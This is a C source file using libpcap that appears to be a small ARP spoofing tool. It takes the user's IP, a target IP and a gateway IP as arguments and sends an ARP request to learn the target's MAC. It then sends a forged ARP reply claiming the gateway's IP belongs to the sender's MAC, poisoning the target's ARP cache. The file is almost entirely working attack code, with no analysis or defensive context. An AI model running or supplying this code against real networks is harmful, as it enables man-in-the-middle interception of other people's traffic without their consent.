#include <pcap.h>
#include <stdio.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>

#define ETHER_ADDR_LEN 6

/* Ethernet header */
struct sniff_ethernet {
    u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
    u_short ether_type; /* IP? ARP? RARP? etc */
    u_short arp_type;
    u_short protocol_type;
    u_char arp_hardware_size;
    u_char arp_protocol_size;
    u_short arp_opcode;
    u_char arp_sender_mac[6];
    u_char arp_sender_ip[4];
    u_char arp_target_mac[6];
    u_char arp_target_ip[4];
};

void getMyMacAddress(u_char *my_mac);
int main(int argc, char* argv[])
{
    /*u_char arp_packet[42] = {0x00, 0x0c, 0x29, 0x1d, 0xa5, 0x3f, 0x00, 0x0c, 0x29, 0xd9, 0x27, 0x20, 0x08, 0x06, 0x00, 0x01,
                             0x08, 0x00, 0x06, 0x04, 0x00, 0x02, 0x00, 0x0c, 0x29, 0xd9, 0x27, 0x20, 0xc0, 0xa8, 0xd5, 0x02,
                             0x00, 0x0c, 0x29, 0x1d, 0xa5, 0x3f, 0xc0, 0xa8, 0xd5, 0x82};*/
    u_char arp_packet[42] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x29, 0xd9, 0x27, 0x20, 0x08, 0x06, 0x00, 0x01,
                             0x08, 0x00, 0x06, 0x04, 0x00, 0x02, 0x00, 0x0c, 0x29, 0xd9, 0x27, 0x20, 0x00, 0x00, 0x00, 0x00,
                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0xa8, 0xd5, 0x82};

    u_char request_packet[42] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01,
                                 0x08, 0x00, 0x06, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};// eth->ether_dhost = my mac;
    pcap_t *fp;
    FILE* m;
    struct pcap_pkthdr *header;
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    const u_char *p;
    int check = 0;
    int i = 0;
    char *mac;
    unsigned int my_ip;
    unsigned int target_ip;
    unsigned int gw_ip;
    char tmp[20] = {0};
    u_char my_mac[6];

    m = fopen("/sys/class/net/eth0/address","r");

    getMyMacAddress(my_mac);

    if(m)
    {
        fread(tmp, sizeof(tmp), 1, m);
    }
    //my_mac = inet_addr(tmp);
    //printf("%s\n", tmp);

    if(argc != 5)
    {
        printf("error\n");
       // exit(0);
    }

    dev = pcap_lookupdev(errbuf);
    fp = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf);

//    atoi()
    printf("%s \n", argv[1]);
    my_ip = inet_addr(argv[1]);
    target_ip = inet_addr(argv[2]);
    gw_ip = inet_addr(argv[3]);
    printf("%x \n", ntohl(my_ip));
    printf("%x \n", ntohl(target_ip));
    printf("%x \n", ntohl(gw_ip));

    while(1)
    {
        const struct sniff_ethernet *req;
        req = (struct sniff_ethernet*)(request_packet);
        memcpy(req->arp_sender_mac,my_mac,sizeof(my_mac));
        memcpy(req->ether_shost,my_mac,sizeof(my_mac));
        memcpy(req->arp_sender_ip,&my_ip,sizeof(int));
        memcpy(req->arp_target_ip,&target_ip,sizeof(int));

        for(i = 0; i < 4; i++)
        {
            printf("%d.", req->arp_sender_ip[i]);
        }
        pcap_sendpacket(fp, request_packet, sizeof(request_packet));
        check = pcap_next_ex(fp, &header, &p);

        if(check == 1)
        {
            const struct sniff_ethernet *eth;
            const struct sniff_ethernet *arp;
            eth = (struct sniff_ethernet*)(p);
            arp = (struct sniff_ethernet*)(arp_packet);
            if(ntohs(eth->ether_type) == 0x0806)
            {
                memcpy(arp->ether_dhost,eth->ether_shost,sizeof(eth->ether_shost));
                memcpy(arp->arp_target_mac,eth->ether_shost,sizeof(eth->ether_shost));
                memcpy(arp->arp_sender_ip,&gw_ip,sizeof(int));
                memcpy(arp->arp_target_ip,&target_ip,sizeof(int));
                break;
            }
        }
    }

    pcap_sendpacket(fp, arp_packet, sizeof(arp_packet));
    printf("=========arp request=========\n");

    return 0;
}

void getMyMacAddress(u_char *my_mac)
{
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;
    int i = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    if (success)
    {
        memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
    }

    for(i = 0; i < 6; i++)
    {
        printf("%x:",my_mac[i]);
    }
}
